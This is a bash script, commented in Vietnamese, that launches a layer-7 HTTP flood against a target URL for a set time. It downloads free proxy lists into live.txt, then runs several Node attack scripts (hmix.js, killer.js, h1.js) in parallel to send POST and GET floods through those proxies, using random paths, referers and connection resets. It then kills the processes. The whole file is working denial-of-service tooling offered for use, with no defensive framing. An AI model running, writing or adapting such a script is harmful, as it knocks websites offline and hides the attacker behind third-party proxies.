#!/bin/bash

# Usage: ./script.sh <URL> <TIME> 
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy vào live.txt cho cả HTTP, HTTPS
> live.txt
for type in http https; do
curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt" >> live.txt
curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=1000&protocol=${type}" >> live.txt
done

# Chạy các script node
node hmix.js -m POST -u $URL -s $TIME -p live.txt -t 1 --full true -d false &
node killer.js POST $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
node killer.js GET $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &

# Dừng toàn bộ sau khi chạy xong TIME giây
sleep $TIME
pkill -f "hmix.js|h1.js|h2.js|killer.js|http1.js|http2.js"
